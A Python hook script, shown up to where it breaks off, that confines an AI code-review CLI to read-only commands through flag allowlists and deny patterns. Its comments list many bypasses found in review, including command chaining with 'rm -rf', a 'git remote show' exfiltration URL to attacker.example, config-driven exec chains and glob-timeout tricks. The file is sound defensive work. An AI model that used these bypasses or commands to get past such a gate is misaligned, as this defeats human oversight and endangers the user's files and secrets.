#!/usr/bin/env python3
"""team-management read-only gate for the Antigravity CLI (`agy`).

Deployed by team-management into a project's `.agents/hooks.json` as a
`PreToolUse` hook (named `team-management-readonly-gate`). It CONTAINS the
headless `agy` run that the `agy-cli` wrapper uses for code review. agy is
unblocked by `permissions.allow` rules in the user's global settings.json (the
removed `--dangerously-skip-permissions` flag did the same job with a far larger
blast radius, and harness security monitors block it); THIS gate is the security
boundary — it hard-`deny`s every tool call outside a read-only
allowlist, so agy can inspect the repo but cannot mutate it or reach the
network.

SCOPE, so the guarantee is not overread: read-only is not read-SCOPED. `cat` is
allowlisted, so anything readable from the workspace (including files outside it)
can be read and therefore transmitted to the provider as part of a review. The
boundary this gate enforces is "cannot change your machine and cannot exfiltrate
directly", not "cannot see your secrets" (code-review round 2, N3).

Contract (agy lifecycle hooks): read a JSON tool-call payload on stdin, write
`{"decision": "allow"|"deny", "reason": "..."}` on stdout. A `deny` decision
hard-blocks the tool before it runs. Fail CLOSED: any malformed input or
unexpected tool → `deny`.

Load-bearing agy-runtime assumptions this containment relies on (verified live in
m-fix-agy-headless-review; a future agy version could change them):
  - agy runs this PreToolUse hook with cwd = the `.agents/` dir, so the relative
    `python3 agy-readonly-gate.py` command in hooks.json resolves;
  - a hook `deny` OVERRIDES any `allow` (from a user's own named PreToolUse hook);
  - agy fails CLOSED if the hook command errors (missing python3, non-zero exit).
UNVERIFIED, and the one lever a payload controls: what agy does when the hook exceeds
its `timeout: 10`. Treated as possibly fail-OPEN until measured, which is why glob
expansion is bounded by `_MAX_GLOB_COMPONENTS` before it runs rather than only by its
result size (round 6, F10).
The wrapper's read-only guarantee = this gate (prevention) + the wrapper's
before/after git-status mutation check (detection); neither alone is sufficient
(the mutation check does not see network egress or out-of-repo writes).

Stdlib only. Do NOT edit the deployed copy — it is refreshed by
team-management on change; customize the allowlist in the plugin source
(`plugin/templates/agy-readonly-gate.py`).
"""
import glob
import json
import os
import re
import shlex
import sys
import time

# Read-only commands agy may run during a review, matched as an exact TOKEN — see
# `_tokenize` for why nothing here is matched against the raw command string, and
# `_COMMAND_FLAG_POLICY` for the per-command flag allowlist each one is held to.
#
# FIVE commands were removed across code review rounds 2 and 4: `find` and `sed`
# (`find -exec`/`-delete`, `sed -i`), then `sort`, `uniq` and `file`
# (`sort --compress-program=<cmd>` executes it, `uniq IN OUT` writes its second
# operand with NO flag involved, `file -C -m` compiles a magic file to disk). The
# standard each failed is the one in `shared_state._AGY_PERMISSION_RULES`: the rules
# file is GLOBAL while this gate is per project, so a command must be defensible
# without assuming the gate is there. All five were dropped from the rules AND from
# here — the two lists move together, and the drift guard asserts rules ⊇ gate bases.
# The capability loss is small: agy has native `find_by_name` / `grep_search` /
# `list_dir` tools, `rg --files` lists files, and `head`/`tail` page one.
_READONLY_COMMANDS = frozenset({
    "ls", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
    "pwd", "stat", "nl", "cut", "tr", "column",
})

# Per-command FLAG ALLOWLIST — the policy inversion (code-review round 4, Note 3).
# Four rounds of review kept finding one more dangerous flag to deny (`-delete`,
# `-O`, `--ext-diff`, `sort -o`, `tail -f`, `--compress-program`, `file -C`, long-
# option abbreviations…). Enumerating what is forbidden loses that race by
# construction; enumerating what is PERMITTED makes the failure mode "over-block a
# benign read" instead of "silently allow a write".
#
# Format: command -> (allowed short letters, allowed long option names).
# A short token must consist only of allowed letters; a long token's name must be a
# prefix of an allowed name (so unambiguous abbreviations work). Unknown → deny.
#
# Short flags that take a VALUE. The value may be attached (`-d,`, `-n20`) or the
# next token, so scanning stops at the first one — otherwise `cut -d,` reads the
# delimiter `,` as a disallowed flag letter and an ordinary read is refused.
_SHORT_VALUE_FLAGS = {
    "head": "cn", "tail": "cn", "grep": "ABCefmd", "rg": "ABCegmt",
    "stat": "cf", "nl": "bfhilsvw", "cut": "bcdf", "column": "sct",
    # Explicit empties: `_flags_allowed` reads this via .get(base, ""), so these are
    # behaviourally identical to omission. Kept so every allowlisted command appears
    # in BOTH policy tables and a missing row reads as an oversight, not a decision.
    "ls": "", "cat": "", "wc": "", "pwd": "", "tr": "",
}

_COMMAND_FLAG_POLICY = {
    # `color`/`colour`: grep and rg both permit theirs, so refusing ls's was the same
    # one-option-two-verdicts inconsistency rounds 5 and 6 removed elsewhere, here in
    # the over-block direction (round 8, N3).
    "ls":     ("aAdFghlorRSt1", {"all", "almost-all", "classify", "human-readable",
                               "long", "reverse", "recursive", "size", "time", "sort",
                               "color", "colour"}),
    "cat":    ("bnsvET", {"number", "number-nonblank", "show-ends", "squeeze-blank",
                          "show-tabs", "show-nonprinting"}),
    "head":   ("cnqv", {"bytes", "lines", "quiet", "silent", "verbose"}),
    # NOTE tail: `follow`/`retry` are deliberately absent — they never return and the
    # run dies at the external watchdog with no review (rounds 2 W2 / 4 W1).
    "tail":   ("cnqv", {"bytes", "lines", "quiet", "silent", "verbose"}),
    "wc":     ("clmwL", {"bytes", "chars", "lines", "words", "max-line-length"}),
    "grep":   ("AaBbCcEeFfHhIiLlmnoqRrsvwxyz", {
        "after-context", "before-context", "context", "count", "extended-regexp",
        "fixed-strings", "basic-regexp", "perl-regexp", "file", "ignore-case",
        "include", "exclude", "exclude-dir", "line-number", "only-matching",
        "recursive", "dereference-recursive", "word-regexp", "line-regexp",
        "invert-match", "files-with-matches", "files-without-match", "max-count",
        "no-filename", "with-filename", "color", "colour", "binary-files",
        "no-messages", "quiet", "silent", "text", "null", "null-data"}),
    # NOTE rg: `z` is ABSENT on purpose. `-z` is `--search-zip`, which spawns an
    # external decompressor (gzip/xz/zstd/7z) from PATH on every matching archive —
    # program execution from inside a gate whose boundary is "cannot change your
    # machine". The long spelling was already denied (`search-zip` is not below), so
    # allowing the short one made one option carry two verdicts (round 5, W1).
    "rg":     ("ABCcEeFgHhiIlLmnNoqrsStuvwx", {
        "after-context", "before-context", "context", "count", "count-matches",
        "fixed-strings", "glob", "iglob", "hidden", "ignore-case", "smart-case",
        "case-sensitive", "files", "files-with-matches", "files-without-match",
        "line-number", "no-line-number", "max-count", "max-depth", "no-heading",
        "heading", "no-filename", "with-filename", "only-matching", "type",
        "type-not", "type-list", "word-regexp", "line-regexp", "invert-match",
        "json", "column", "sort", "sortr", "no-ignore", "color", "colors",
        "multiline", "regexp", "replace", "stats", "trim", "vimgrep"}),
    "pwd":    ("LP", {"logical", "physical"}),
    "stat":   ("cfLnst", {"format", "printf", "dereference", "terse", "file-system"}),
    "nl":     ("bfhilnpsvw", {"body-numbering", "header-numbering", "footer-numbering",
                              "number-format", "number-width", "number-separator",
                              "starting-line-number", "line-increment", "join-blank-lines"}),
    "cut":    ("bcdfsn", {"bytes", "characters", "delimiter", "fields", "complement",
                          "only-delimited", "output-delimiter", "zero-terminated"}),
    "tr":     ("cdstu", {"complement", "delete", "squeeze-repeats", "truncate-set1"}),
    "column": ("tsxc", {"table", "separator", "output-separator", "columns"}),
}

# egrep/fgrep are grep with a preset pattern mode, so they share its policy. Without
# rows of their own `_flags_allowed` refused them outright (an unknown base denies)
# while `_AGY_PERMISSION_RULES` still granted them — a gate stricter than its own
# command list, found by the spec audit rather than by a test (round 7, defect 4).
_COMMAND_FLAG_POLICY["egrep"] = _COMMAND_FLAG_POLICY["grep"]
_COMMAND_FLAG_POLICY["fgrep"] = _COMMAND_FLAG_POLICY["grep"]
_SHORT_VALUE_FLAGS["egrep"] = _SHORT_VALUE_FLAGS["grep"]
_SHORT_VALUE_FLAGS["fgrep"] = _SHORT_VALUE_FLAGS["grep"]

# git subcommands that are read-only in their PLAIN forms. `branch`, `remote` and
# `config` each have mutating forms (`git branch -D`, `git remote add`,
# `git config user.name x`), so they carry an extra guard in `_git_subcommand_is_readonly`.
# Adding a subcommand here without checking its write forms is how this allowlist
# turns into a write channel.
_READONLY_GIT_SUBCOMMANDS = frozenset({
    "status", "diff", "log", "show", "rev-parse", "ls-files", "blame", "cat-file",
    "describe", "shortlog", "ls-tree", "merge-base", "rev-list", "diff-tree",
    "grep", "branch", "remote", "config",
})

# Any of these disqualifies a command outright — they enable chaining a second
# command, redirection, command substitution, or a subshell past the read-only
# prefix (e.g. `git diff; rm x`, `cat $(whoami)`, `git log ` + backtick).
#
# `|` is deliberately ABSENT: paging a large file needs a pipeline, and denying it
# outright made agy dump whole files and return an empty review (m-fix-agy-launch-
# and-gate). Pipelines are instead validated segment-by-segment. `&` STAYS, so `&&`
# and backgrounding remain denied, and `||` is refused by `_tokenize`.
#
# Backslash is NOT in this class on purpose: `rg '\bdef\b' src` is everyday review
# work. It used to be a hole — the old hand-rolled splitter treated `\'` as a quote
# delimiter while the shell treats it as a literal, so `cat \' | rm -rf x \'` was
# read as ONE quoted segment and allowed while the shell ran the second command
# (code-review round 2, C1). `_tokenize` closes it by letting shlex do the parsing.
_METACHAR_RE = re.compile(r"[;&<>`$(){}\n\r]")

# Write/exec-enabling flags that turn an ALLOWLISTED command into a mutation or
# code-execution vector even with no shell metachar. Denied regardless of the base
# command (belt-and-suspenders over the allowlist). Covers two classes:
#
# NOTE on what is NOT here any more: `find`'s action predicates (`-exec`, `-delete`,
# `-fprint0`, `-ok`, …) used to lead this list. `find`, `sed`, `sort`, `uniq` and
# `file` were expelled from `_READONLY_COMMANDS` (round 4), so those tokens are now
# unreachable — the base-command check refuses the whole invocation before any flag
# is inspected. Guarding a flag of a command that cannot run is dead weight that
# reads like live protection, so it was removed. If any of those commands is ever
# re-admitted, its write/exec predicates must come back WITH it; do not re-add the
# flag guard alone and conclude the command is safe.
#   1. write-to-file flags — `git diff --output=<file>`. Matched only as a complete
#      flag (`--output` + `=`/space/EOL) so it does NOT over-block a benign read
#      flag like `--output-indicator-new`.
#   2. external-command execution FLAGS — git's `--ext-diff`/`--textconv` and
#      ripgrep's `--pre`/`--pre-glob`/`--hostname-bin` force a config-defined driver
#      to run. NOTE (accepted limitation): this closes the FLAG-forced path only. git
#      also honors a `diff.external` in `.git/config` or a `.gitattributes` textconv
#      driver on a PLAIN `git diff`/`log -p`/`show`/`blame` with NO flag (`blame`
#      applies textconv by default and needs `--no-textconv` to opt out), and
#      `git status` can spawn a configured `core.fsmonitor` — that driver runs
#      INSIDE git, not as a tool call agy makes, so this gate cannot intercept it.
#      Safe for the intended use (reviewing the user's OWN repo, whose `.git/config`
#      is trusted). Do NOT point agy at a repo whose `.git/config`/`.gitattributes`
#      you do not trust. (`env -i` already neutralizes the env `GIT_EXTERNAL_DIFF`.)
# `-o` is intentionally NOT here: on the allowlist it only appears as `ls -o`
# (read) — the write vector is `--output`, and `sort` is no longer a command at all.
#   3. pager-exec flags — `git grep -O <cmd>` / `--open-files-in-pager <cmd>` runs
#      an arbitrary program on the matches, THROUGH A SHELL. `-[a-zA-Z]*O` matches
#      the clustered spelling too: git's parse-opt accepts `-nOsh` as `-n -Osh`, so
#      a rule requiring `O` to follow the dash directly closed only the spelling
#      nobody would attack with (code-review round 2, C3).
#
# EVERY alternative below matches a WHOLE TOKEN (`^…$`-style), never a substring of
# the raw command line. The raw-string version was defeated by one quote character:
# the shell strips quotes before the program sees the argument, so `find . "-delete"`
# broke the `(?:^|\s)-` anchor while `find` still received `-delete` intact
# (code-review round 2, C2).
_DANGEROUS_FLAG_TOKEN_RE = re.compile(r"^-[a-zA-Z]*O")

# Long options are matched by ABBREVIATION, not by exact spelling. git's parse_options
# and getopt_long both accept any unambiguous prefix, so `git grep --open=<cmd>` runs
# the pager and `sort --outp=<file>` writes — while a guard requiring the full name
# sees neither (round 3, C2). A token `--name[=value]` is refused when `name` is a
# prefix of a dangerous option; the relation is one-directional on purpose, so the
# genuinely distinct read flag `--output-indicator-new` (not a prefix of `--output`)
# keeps working.
#
# ACCEPTED consequence of the same prefix rule, in the permitting direction: a token
# may resolve against a LONGER permitted name it merely prefixes, so `rg --file=X` /
# `grep --file=X` are allowed via `files*` (round 5, N3). Both read patterns FROM a
# file — read-only, and squarely inside the "read-only is not read-SCOPED" boundary
# stated at the top of this file. Not fixed, because exact-matching long options is
# what would have to change, and the same prefix relation is what makes the DANGEROUS
# check above catch `--open=<cmd>` and `--outp=<file>`.
_DANGEROUS_LONG_OPTIONS = (
    "output", "ext-diff", "textconv", "pre", "pre-glob", "hostname-bin",
    "open-files-in-pager",
    # `help` is here for the GIT path, which has no per-command flag allowlist and is
    # therefore protected by this list alone. git rewrites `git diff --help` into
    # `git help diff`, which execs `man` — a program launched from inside a gate whose
    # boundary is "cannot change your machine" (round 5, N2). No review needs it.
    # Prefix matching makes `--h`/`--he`/`--hel` fall with it; `--hidden` and
    # `--heading` are unaffected (neither is a prefix of `help`).
    "help",
    # `git log/show --show-signature` runs `gpg.program` from repo config — the same
    # flag-forced exec shape as `--ext-diff` (round 6, F4). Safe as a global entry:
    # `--show-notes` / `--show-linear-break` are not prefixes of it, so only the
    # ambiguous `--show…` stem falls with it.
    "show-signature",
)


def _long_option_name(token):
    """`--foo=bar` → `foo`; `--foo` → `foo`; anything else → None."""
    if not token.startswith("--") or token == "--":
        return None
    return token[2:].split("=", 1)[0]


def _is_dangerous_long_option(token, options=None):
    # `options=None` and a lookup at CALL time, not `options=_DANGEROUS_LONG_OPTIONS`:
    # a default argument binds the tuple when the function is DEFINED, so reassigning
    # the module constant silently changed nothing. That defeated a reviewer's mutation
    # run — the guard kept denying after `help` was "removed" — and would make any
    # future coverage test that monkeypatches the constant pass without proving
    # anything (round 6, F6).
    if options is None:
        options = _DANGEROUS_LONG_OPTIONS
    name = _long_option_name(token)
    if not name:
        return False
    return any(full.startswith(name) for full in options)
# NOTE the bare `-O` above (no terminator): `git grep -O<pager>` is PARSE_OPT_OPTARG,
# so `-Osh` is valid and runs the pager THROUGH THE SHELL — arbitrary command
# execution from inside a "read-only" gate. Requiring `=`/space/EOL after `-O`
# caught only the spelling nobody would use to attack it. Accepted false positive:
# `git log -O <orderfile>` (a read) is now denied; no allowlisted command needs a
# `-O*` token, so the trade is one-sided.

# agy tool names that only read. NOTE the spelling trap: the binary's enum is
# CORTEX_STEP_TYPE_LIST_DIRECTORY, but the name agy 1.1.11 actually puts on the
# wire is `list_dir` (confirmed from live hook payloads and from the CLI's own
# tool-list string "grep_search, find_by_name, view_file, and list_dir"). Denying
# `list_dir` blinds the reviewer to the directory tree, so BOTH spellings are
# accepted — the enum name costs nothing and survives a future rename.
_READ_TOOLS = frozenset({
    "view_file", "read_file", "list_dir", "list_directory", "grep_search",
    "codebase_search", "find_files", "find_by_name", "read_files",
    "view_code_item", "view_file_outline", "view_content_chunk",
})

# Pipelines longer than this are refused outright — a review needs two or three
# stages, and an unbounded chain is a sign of something other than paging.
_MAX_PIPELINE_SEGMENTS = 8

# Pathname-expansion characters. A token carrying one of these is not yet argv —
# the shell will expand it, and the expansion can introduce FLAG-shaped tokens the
# guards would otherwise never see. `_expand_globs` resolves them first.
_GLOB_CHARS_RE = re.compile(r"[*?\[]")

# Commands accepting the bare-number shorthand (`head -50` == `head -n 50`). Every
# other per-command policy fact in this file lives in a named constant; this one
# used to be a tuple literal inside the flag loop, where an audit would miss it.
_NUMERIC_SHORTHAND_COMMANDS = frozenset({"head", "tail"})

# Upper bound on glob-bearing path COMPONENTS in one pattern, checked BEFORE the
# expansion runs. `_MAX_GLOB_MATCHES` cannot serve here: it refuses the result only
# after paying for it, and the deployed hook has a 10s timeout. Measured AGAINST `/`:
# 1-4 components cost <=0.09s, six cost 3.73s and 205k matches. Do NOT re-tune from
# that number alone — it is a property of the tree being walked, not of the component
# count. The derived root is always the PROJECT, never `/`, and the same 4-component
# pattern costs 1.03s on a 28,930-directory tree (round 8, W4). Note also that
# `glob.glob` IGNORES `root_dir` for an ABSOLUTE pattern, so `/*/*/*/*` walks from `/`
# whatever the derived root is — the walked tree is NOT bounded by the project
# (round 9, N2). That is why the adversarial payloads in the tests use absolute
# patterns and still cost seconds from a four-entry project directory. Component count is the
# cheap pre-filter; `_GLOB_TIME_BUDGET_S` is the real bound.
_MAX_GLOB_COMPONENTS = 4

# Wall-clock budget for glob expansion across one DECISION (all pipeline segments),
# created in `decide` and threaded through. What it does NOT cover, stated so the
# guarantee is not overread: the check runs BETWEEN tokens and nothing interrupts a
# single `glob.glob`. The check also runs once per TOKEN, before the loop over roots,
# so a token pays one glob per root past the deadline: the real bound is
# `budget + len(roots) x worst-case glob`. A 4-component pattern measured 1.03s on a
# 28,930-directory tree and 0.96s at $HOME, so with a payload-supplied second root the
# worst case is ~4.2s against the hook's 10s (round 9, N1). Tokenisation is outside it too (~0.24 s/MB of command line,
# unreachable in practice). Consequence worth knowing when diagnosing an over-block:
# on a very large repo a command with several expensive globs can exhaust the budget
# and be DENIED — the only load-dependent verdict this gate has, and in the
# fail-closed direction (round 8, W3/N1/N2). A second, older over-block lives next
# door and is easy to misattribute: `ls */*/*` on a ~22,000-directory tree is refused
# in 0.07s by `_MAX_GLOB_MATCHES`, not by this budget (round 9, N3). `_MAX_GLOB_COMPONENTS`
# bounds a single pattern; it does NOT bound a command that repeats a cheap-looking
# pattern hundreds of times, and the cost is the SUM. Measured on the real deployed
# hook: `rm -rf /tmp/pwned` followed by 150 copies of `/*/*/*/*/zzqqzz` took 16.7s,
# and `cat` with 120 copies of `../../../../../../../*/*/*/*/zzqqzz` took 13.2s — the
# latter counts exactly 4 components, so the per-token bound reports it as safe while
# it walks from `/`. Both blow the hook's `timeout: 10`, whose failure mode this file
# declines to assume is fail-closed (round 7, C1). A pattern that matches NOTHING pays
# the full directory walk and appends its literal, so `_MAX_GLOB_MATCHES` never trips
# either. The deadline is the only bound that tracks what actually costs time.
_GLOB_TIME_BUDGET_S = 2.0

# Upper bound on tokens after expansion. `rg pat *` in a normal repo expands to a
# handful of top-level entries; a command that expands past this is refused rather
# than validated, so a pathological pattern cannot turn the gate into the slow path.
_MAX_GLOB_MATCHES = 4096

# Read-only flag vocabulary for the git subcommands that also have write forms.
# `branch` is the dangerous one: a bare positional CREATES a branch, so only flags
# are tolerated — plus the operand of a flag that takes one.
_GIT_BRANCH_READ_FLAGS = frozenset({
    "-a", "-r", "-v", "-vv", "--all", "--remotes", "--verbose",
    "--list", "--show-current", "--contains", "--merged", "--no-merged",
})
_GIT_BRANCH_VALUE_FLAGS = frozenset({"--contains", "--merged", "--no-merged", "--list"})
# `git remote` — the ONLY read operand permitted is `get-url` (it prints from
# .git/config and touches no network). `show` is deliberately NOT here: it queries
# the remote unless `-n` is passed, and git accepts a URL where a remote name is
# expected, so `git remote show https://attacker.example/exfil-<data>.git` is an
# arbitrary egress channel — paired with the long-allowlisted `cat`, that turns
# read-everything into exfiltrate-everything.
_GIT_REMOTE_READ_OPERANDS = frozenset({"get-url"})
_GIT_CONFIG_READ_FLAGS = frozenset({"--get", "--get-all", "--get-regexp", "--list", "-l"})


def _git_subcommand_is_readonly(tokens):
    """Return True iff a `git ...` segment is in a read-only form.

    Only the three subcommands with write forms are inspected; the rest of the
    allowlist is read-only in every invocation. Fail closed on anything unparsed.
    """
    if len(tokens) < 2:
        return False
    sub, rest = tokens[1], tokens[2:]

    if sub == "cat-file":
        # `git cat-file --filters <blob>` runs the `.gitattributes`/`.git/config`
        # smudge filter for that path — a config-defined program, executed inside git.
        # Verified live: a `filter.evil.smudge = sh -c "…"` entry ran on an ALLOWED
        # invocation (round 6, F4). This belongs to the flag-FORCED exec class that
        # `_DANGEROUS_LONG_OPTIONS` closes, not to the accepted no-flag `diff.external`
        # limitation, so it is closed here.
        #
        # Guarded per-subcommand rather than in the global list on purpose: prefix
        # matching would make a global `filters` entry also refuse `--filter`, and
        # `git rev-list --filter=blob:none HEAD` is ordinary review work. `cat-file`'s
        # own `--filter` is an unambiguous abbreviation OF `--filters`, so both
        # spellings are refused here and nowhere else.
        for token in rest:
            name = _long_option_name(token)
            # `name is not None` is load-bearing: a bare `--` separator has no option
            # name, and `"filters".startswith(None)` raises TypeError (round 7, W1).
            if name is not None and "filters".startswith(name):
                return False
        return True

    if sub == "branch":
        # A positional operand CREATES a branch (`git branch newname`), so only
        # read-only flags — and the operand of a flag that takes one — may follow.
        expect_value = False
        for token in rest:
            if expect_value:
                expect_value = False
                continue
            if not token.startswith("-"):
                return False
            flag = token.split("=", 1)[0]
            if flag not in _GIT_BRANCH_READ_FLAGS:
                return False
            if flag in _GIT_BRANCH_VALUE_FLAGS and "=" not in token:
                expect_value = True
        return True

    if sub == "remote":
        # Inspect EVERY token, not rest[0]: git accepts a flag before the
        # subcommand, so `git remote -v add evil <url>` sails past a first-token
        # check and rewrites .git/config. `set-url origin <attacker>` silently
        # repoints the push target — the repository leaves on the next push.
        operands = [t for t in rest if not t.startswith("-")]
        if not operands:
            return True  # bare `git remote`, or only read flags (-v/--verbose)
        return operands[0] in _GIT_REMOTE_READ_OPERANDS

    if sub == "config":
        # `git config a b` WRITES. A read requires an explicit read flag — and that
        # flag must come FIRST. "a read flag appears anywhere in rest" was bypassable
        # with `git config -- diff.external <cmd> --get`: after `--`, git treats
        # `--get` as a positional, so the read flag was decorative while the real form
        # was the two-positional write. That write then sets a `diff.external` driver
        # which a later plain `git diff` executes — turning a documented accepted
        # limitation into a live exec chain (round 4, C2).
        if "--" in rest:
            return False
        return bool(rest) and rest[0].split("=", 1)[0] in _GIT_CONFIG_READ_FLAGS

    return True


def _tokenize(cmd):
    """Parse `cmd` the way the SHELL will, then split into pipeline segments.

    Returns a list of segments (each a list of dequoted tokens), or None when the
    command cannot be parsed — which the caller treats as deny.

    Why shlex and not a hand-rolled scanner: the hand-rolled version was wrong twice
    in the same review, in the same way — it worked on the raw string while the shell
    works on dequoted arguments.

      * It treated `\\'` as a quote delimiter. The shell treats it as a LITERAL, so
        `cat \\' | rm -rf x \\'` was read as one quoted segment and allowed, while the
        shell happily ran the second command (round 2, C1).
      * Every flag guard was a substring match over the raw line, so one quote
        character broke the anchor while the program still received the flag:
        `find . "-delete"` passed the guard whose only job was `-delete` (round 2, C2).

    `shlex(posix=True)` resolves quoting and backslash escapes exactly as the shell
    does, and raises ValueError on an unbalanced quote. `punctuation_chars="|"` makes
    `|` its own token; `||` arrives as a single token and is refused outright.

    NOTE what this step does NOT do: shlex performs quote/escape removal only, never
    pathname expansion. The tokens it returns are the shell's WORDS, not yet its argv.
    `_expand_globs` closes that remaining gap — see its docstring for why the
    difference is a security boundary and not a technicality (round 5, C1).
    """
    try:
        lexer = shlex.shlex(cmd, posix=True, punctuation_chars="|")
        lexer.whitespace_split = True
        # `commenters` MUST be cleared. shlex defaults to '#' and drops the rest of
        # the line from ANY word containing it; POSIX sh only starts a comment at the
        # START of a word. So `git log -1 --grep=x#y --output=/tmp/pwned` tokenized to
        # `git log -1 --grep=x` — the guards never saw `--output` while the shell
        # passed it straight to git, writing the file (round 3, C1). Every guard below
        # is only as good as the token list being the argv the program receives.
        lexer.commenters = ""
        tokens = list(lexer)
    except ValueError:
        return None  # unbalanced quote / unterminated escape — unparseable, deny
    segments, current = [], []
    for token in tokens:
        if token == "|":
            segments.append(current)
            current = []
        elif set(token) == {"|"}:
            return None  # `||` (or longer) — control flow, not a pipeline
        else:
            current.append(token)
    segments.append(current)
    return segments


def _expansion_roots(payload_cwd):
    """Directories to expand a glob against. `None` in the list == this process's cwd.

    Returns a LIST that is unioned over, never a single winner. That is the whole
    design: a payload-supplied directory may only ADD candidate expansions, never
    replace the derived one. Letting it replace made one unvalidated field a kill
    switch for this entire guard — `Cwd: "/tmp"`, `Cwd: "."` and `Cwd: "/nonexistent"`
    each expanded to nothing, `_expand_globs` kept the literal `*`, and the escape was
    live again while the payload looked ordinary (code-review round 5, C1). Every
    wrong value failed OPEN and silently, because "wrong directory" and "pattern
    matched nothing" are indistinguishable from the outside.

    Why unioning is sound — stated precisely, because the obvious argument is FALSE.
    It is tempting to say "more roots only add tokens to object to, so no `Cwd` can
    turn a deny into an allow". Measured counterexample: `ls -l*` denies with the
    derived root alone (the literal `-l*` is not an allowed flag) and ALLOWS once a
    root containing a file named `-la` is added — because a matched pattern REPLACES
    its literal, so an added root can remove a token the guards were refusing. Union
    is not monotone in the verdict (round 6, F3).

    The real property is narrower and holds. Every token the union produces goes
    through the full flag allowlist, so a flip can only land on something already
    permitted. And a refused literal can only be expanded away if it is itself
    glob-shaped: the dangerous long options are plain names, leaving exactly one such
    literal — `-O*`, which the pager-exec regex refuses. Every path it can match begins
    `-O`, and that same regex refuses all of them, so the expansion cannot escape
    either. Pinned by `test_the_one_glob_shaped_refused_literal_expands_only_into_
    refused_tokens`, because this is the kind of argument that quietly stops being true
    when the regex is edited. That is what makes the extra root safe — not
    monotonicity.

    Getting this wrong is not a cosmetic default: expanding in the wrong directory
    finds nothing, `_expand_globs` then keeps the literal pattern, and the escape it
    exists to close stays open — silently, since a wrong root looks exactly like a
    pattern that matched nothing.

    **This process's cwd is the wrong answer.** `hooks.json` invokes the gate as the
    RELATIVE `python3 agy-readonly-gate.py`, which resolves only because agy runs the
    hook with cwd = the `.agents/` directory (a load-bearing runtime assumption
    recorded at the top of this file). agy's own commands run against the workspace —
    `--add-dir "$PWD"`, the repository root — one level up.

    So the root is derived from where this script LIVES: the deploy puts it at
    `<project>/.agents/agy-readonly-gate.py`, making `parent.parent` the workspace.
    The `.agents` name check keeps that inference honest — outside the deployed
    layout (the plugin source tree, a test harness) it declines to guess.

    No observed agy payload carries a working directory; the key is honoured because
    a future version might, and because it lets a test state a directory explicitly.
    It is an ADDITION to the derived root, never a substitute for it.

    Accepted limitation, stated without softening: if agy ever runs a command from a
    SUBDIRECTORY of the workspace, the derived root is one level too high and patterns
    under-match. That is not benign — an under-matched pattern keeps its literal `*`,
    which is exactly the pre-round-5 hole (the shell still expands it, possibly into a
    flag-shaped filename). It is accepted because no observed agy invocation runs from
    a subdirectory, and because a payload cwd covers the case if one ever appears; it
    is NOT accepted on the grounds of being harmless.
    """
    roots = []
    here = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(here) == ".agents":
        # Deployed layout: <project>/.agents/agy-readonly-gate.py — the workspace is
        # the parent. This is the live mechanism, because agy runs the hook with
        # cwd = .agents/ (which is why hooks.json can use a relative command) while
        # agy's own commands run against the workspace one level up.
        roots.append(os.path.dirname(here))
    else:
        # Outside the deployed layout (plugin source, test harness) there is nothing
        # to infer from, so fall back to this process's cwd rather than guess.
        roots.append(None)
    if isinstance(payload_cwd, str) and payload_cwd:
        roots.append(payload_cwd)
    return roots


def _expand_globs(tokens, roots=None, deadline=None):
    """Expand pathname patterns the way the shell will, BEFORE the guards run.

    Returns the expanded token list, or None when expansion is unsafe (caller denies).

    Why this exists. Every flag guard in this file assumes it is inspecting the argv
    the program receives. `_tokenize` gives the shell's WORDS, and the shell then
    performs pathname expansion on any unquoted word containing `*`, `?` or `[…]`.
    Filenames are not required to look like operands: `--pre=sh` is a perfectly legal
    filename, and a repository that contains one turns the innocuous `rg needle *`
    into `rg needle --pre=sh a.py`, which makes ripgrep execute `sh` on every file it
    reads. The guard denies `rg --pre=sh needle` when it can see the token and allowed
    the globbed spelling when it could not (round 5, C1). Round 4 saw the same class
    from the other side (`uniq dir/*` reaching uniq with a second, WRITTEN operand)
    and answered it by dropping `uniq`; dropping one command per discovered spelling
    does not scale, so the expansion itself is modelled here instead.

    The quoted/unquoted distinction is already gone by this point — shlex strips
    quotes — so a QUOTED pattern is expanded too, which the shell would not do. That
    asymmetry is deliberate: expanding hands the guards more tokens to judge, so a
    wrong or extra root cannot make a denied command pass. The cost is a possible
    false deny of, say, `rg --glob '*.py'` in a repo that also contains a flag-shaped
    filename — a repository already in the state this guard exists for.

    Do NOT read that as "expansion can only add denials" — it cannot, in either the
    token or the root dimension, and the second claim shipped here wrongly once:
      * A literal the flag allowlist rejects can expand into one it accepts. `ls -l*`
        is denied alone and allowed in a directory holding a file named `-la`
        (round 5, N1) — the shell's own semantics, since a matched pattern replaces
        its literal.
      * Adding a ROOT therefore does not relax nothing either: it can supply the
        match that drops that literal (round 6, F3). `_expansion_roots` unions for a
        different reason — so a payload cannot REPLACE the derived root and expand
        somewhere that finds nothing.
    What makes both safe is that every produced token still goes through the full
    allowlist, and the one refused literal that IS glob-shaped (`-O*`) expands only
    into tokens the same guard refuses. See `_expansion_roots` for the full argument.

    A pattern that matches nothing keeps its literal token, matching the shell's
    default (no `nullglob`). Hidden entries are skipped, as `*` skips them in the
    shell. Expansion is bounded: a command that globs more than `_MAX_GLOB_MATCHES`
    paths is not a review command, and is refused rather than walked. The bound counts
    the UNION, so two roots that are each under it can together exceed it and refuse a
    command a single root would allow — measured, and accepted: the excess direction is
    a denial, the second root only exists when a payload supplies one (no observed agy
    payload does), and the cap is 4096.
    """
    if roots is None:
        roots = [None]
    if deadline is None:
        # Only for direct callers/tests. `decide` MUST pass one, because the budget is
        # per DECISION: computing it here gave every pipeline segment a fresh 2.0s, so
        # a command whose segments each finished just under budget cost 8x it. Measured
        # on the deployed hook: 8 segments x 14 glob tokens = 11.2s, three runs running,
        # against the hook's `timeout: 10` (round 8, C1). Worse, at 19 tokens/segment
        # the verdict became NONDETERMINISTIC — deny at 2.1s or allow at 15.3s depending
        # on load — so a hostile payload retried a few times eventually takes the long
        # path. Two rounds running the bound measured the wrong scope: per-token in
        # round 6, per-segment in round 7.
        deadline = time.monotonic() + _GLOB_TIME_BUDGET_S
    expanded = []
    for token in tokens:
        if not _GLOB_CHARS_RE.search(token):
            expanded.append(token)
            continue
        if sum(1 for part in token.split("/") if _GLOB_CHARS_RE.search(part)) > _MAX_GLOB_COMPONENTS:
            return None   # one pattern too deep to expand within the hook's budget
        if time.monotonic() > deadline:
            return None   # the whole decision has spent its budget — refuse, don't stall
        matches = set()
        for root in roots:
            try:
                matches.update(glob.glob(token, root_dir=root))
            except (OSError, ValueError, re.error):
